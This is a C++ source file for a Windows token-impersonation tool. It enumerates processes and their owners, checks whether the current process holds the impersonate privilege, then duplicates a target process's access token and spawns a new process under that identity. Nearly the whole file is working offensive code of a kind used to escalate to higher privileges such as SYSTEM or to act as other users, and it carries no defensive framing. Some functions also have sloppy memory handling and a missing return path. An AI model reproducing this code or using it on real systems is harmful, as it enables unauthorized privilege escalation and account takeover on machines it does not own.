#include "tokenImpersonate.h"
#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Advapi32.lib")
#include <windows.h>
#include <sddl.h>
#include <strsafe.h>
#include <tlhelp32.h>
#include <unordered_map>
#include <list>
#include <string>
#include <Windows.h>
#include <iostream>
#include <thread>
#include <Securitybaseapi.h>
#include <sddl.h>
using namespace std;
PCHAR tokenImpersonate::CombineUserDomainName(PCHAR Domain, PCHAR UserName){
	size_t DomainNameLength, UserNameLength, DomainUserNameLength;
	PCHAR CombinedUserDomainName;
	StringCchLengthA(Domain, STRSAFE_MAX_CCH, &DomainNameLength);
	StringCchLengthA(UserName, STRSAFE_MAX_CCH, &UserNameLength);
	DomainUserNameLength = DomainNameLength + UserNameLength + 2;
	CombinedUserDomainName = new CHAR[DomainUserNameLength];
	StringCchCopyA(CombinedUserDomainName, DomainUserNameLength, Domain);
	StringCchCatA(CombinedUserDomainName, DomainUserNameLength, (PCHAR)"\\");
	StringCchCatA(CombinedUserDomainName, DomainUserNameLength, UserName);
	return CombinedUserDomainName;
}
void tokenImpersonate::DeallocProcessInfo(PProcessInfo process) {
	process->PID = NULL;
	if (process->Domain_User_Name_Len != 0) {
		delete[]process->Domain_User_Name;
	}
	if (process->Name_Process_Len != NULL) {
		delete[]process->Name_Process;
	}
}
PProcessInfo tokenImpersonate::GetProcessInfo(PPROCESSENTRY32 processEntry32) {
	PProcessInfo Process = new ProcessInfo;
	HANDLE ProcessH, ProcessTokenH;
	Process->PID = processEntry32->th32ProcessID;
	StringCchLengthW(processEntry32->szExeFile, 260, &Process->Name_Process_Len);
	Process->Name_Process = new WCHAR[Process->Name_Process_Len + 1];
	StringCchCopyW(Process->Name_Process, Process->Name_Process_Len + 1, processEntry32->szExeFile);
	ProcessH = OpenProcess(PROCESS_QUERY_INFORMATION, false, Process->PID);
	if (ProcessH == NULL) {
		DeallocProcessInfo(Process);
		return Process;
	}
	if (!OpenProcessToken(ProcessH, TOKEN_QUERY, &ProcessTokenH)) {
		CloseHandle(ProcessH);
		DeallocProcessInfo(Process);
		return Process;
	}
	DWORD ProcessTokenOwnerSize;
	PTOKEN_OWNER ProcessTokenOwnerP;
	if (!GetTokenInformation(ProcessTokenH, TokenOwner, NULL, 0, &ProcessTokenOwnerSize)) {
		ProcessTokenOwnerP = (PTOKEN_OWNER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ProcessTokenOwnerSize);
		if (!GetTokenInformation(ProcessTokenH, TokenOwner, ProcessTokenOwnerP, ProcessTokenOwnerSize,
			&ProcessTokenOwnerSize)) {
			CloseHandle(ProcessH);
			CloseHandle(ProcessTokenH);
			HeapFree(GetProcessHeap(), NULL, ProcessTokenOwnerP);
			DeallocProcessInfo(Process);
			return Process;
		}
		Process->SID_OwnerP = ProcessTokenOwnerP->Owner;
		HeapFree(GetProcessHeap(), NULL, ProcessTokenOwnerP);
		DWORD owner_name_bufsize = 0, domain_name_bufsize = 0;
		SID_NAME_USE SidType;
		PCHAR Username = NULL, Domain = NULL;
		if (!LookupAccountSidA(NULL, Process->SID_OwnerP, Username, &owner_name_bufsize,
			Domain, &domain_name_bufsize, &SidType)) {
			Username = new CHAR[owner_name_bufsize];
			Domain = new CHAR[domain_name_bufsize];
			if (!LookupAccountSidA(NULL, Process->SID_OwnerP, Username, &owner_name_bufsize, Domain,
				&domain_name_bufsize, &SidType)) {
				CloseHandle(ProcessH);
				CloseHandle(ProcessTokenH);
				DeallocProcessInfo(Process);
				return Process;
			}
			Process->Domain_User_Name = CombineUserDomainName(Domain, Username);
		}
		CloseHandle(ProcessH);
		CloseHandle(ProcessTokenH);
		return Process;

	}
}
list<PProcessInfo> tokenImpersonate::EnumerateProcesses() {
	list<PProcessInfo> runningProcesses;
	HANDLE currentProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32 processHolder;
	processHolder.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(currentProcessSnapshot, &processHolder)) {
		cout << "[!] Could not list running processes !" << endl;
		CloseHandle(currentProcessSnapshot);
		exit(0);
	}
	PProcessInfo Process = new ProcessInfo;
	Process = GetProcessInfo(&processHolder);
	if (Process->PID != NULL) {
		runningProcesses.push_back(Process);
	}
	while (Process32Next(currentProcessSnapshot, &processHolder)) {
		Process = new ProcessInfo;
		Process = GetProcessInfo(&processHolder);
		if (Process->PID != NULL) {
			runningProcesses.push_back(Process);
		}
	}
	CloseHandle(currentProcessSnapshot);
	return runningProcesses;

}
bool tokenImpersonate::hasImpersonatePrivilege() {
	HANDLE currentProcessAccessToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &currentProcessAccessToken)) {
		cout << "Failed to open process token." << endl;
		return 0;
	}
	LUID luid;
	if (!LookupPrivilegeValue(0, SE_IMPERSONATE_NAME, &luid)) {
		cout << "Failed to lookup privilege" << endl;
		return 0;
	}
	PRIVILEGE_SET privilegeSet;
	privilegeSet.PrivilegeCount = 1;
	privilegeSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privilegeSet.Privilege[0].Luid = luid;
	privilegeSet.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL result;
	if (!PrivilegeCheck(currentProcessAccessToken, &privilegeSet, &result)) {
		cout << "Failed to check privilege" << endl;
		CloseHandle(currentProcessAccessToken);
		return false;
	}
	CloseHandle(currentProcessAccessToken);
	return result;

}
int tokenImpersonate::ImpersonateTokenAndSpawnNewProcess(int TargetPID, PWCHAR ProcessToLaunch) {
	HANDLE TargetProcH = NULL, TargetProcTokenH = NULL, NewTokenH = NULL;
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&ProcessInformation, sizeof(PROCESS_INFORMATION));
	StartupInfo.cb = sizeof(STARTUPINFO);
	TargetProcH = OpenProcess(PROCESS_QUERY_INFORMATION, true, TargetPID);
	if (TargetProcH == NULL) {
		cout << "Failed to get target process handle !" << endl;
		return -1;
	}
	if (!OpenProcessToken(TargetProcH, TOKEN_DUPLICATE, &TargetProcTokenH)) {
		cout << "Failed to get target process token !" << endl;
		CloseHandle(TargetProcH);
		return 1;
	}
	if (!DuplicateTokenEx(TargetProcTokenH, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary,
		&NewTokenH)) {
		cout << "Failed to duplicate target process's token !" << endl;
		CloseHandle(TargetProcTokenH);
		CloseHandle(TargetProcH);
		return -1;
	}
	LONG ProcessCreationFlags  =  CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP;
	if (!CreateProcessWithTokenW(NewTokenH, LOGON_WITH_PROFILE, NULL, ProcessToLaunch, ProcessCreationFlags,
		NULL, NULL, &StartupInfo, &ProcessInformation)) {
		cout << "Failed to create new process !" << endl;
		CloseHandle(TargetProcTokenH);
		CloseHandle(TargetProcH);
		CloseHandle(NewTokenH);
		return -1;
	}
	return ProcessInformation.dwProcessId;

}

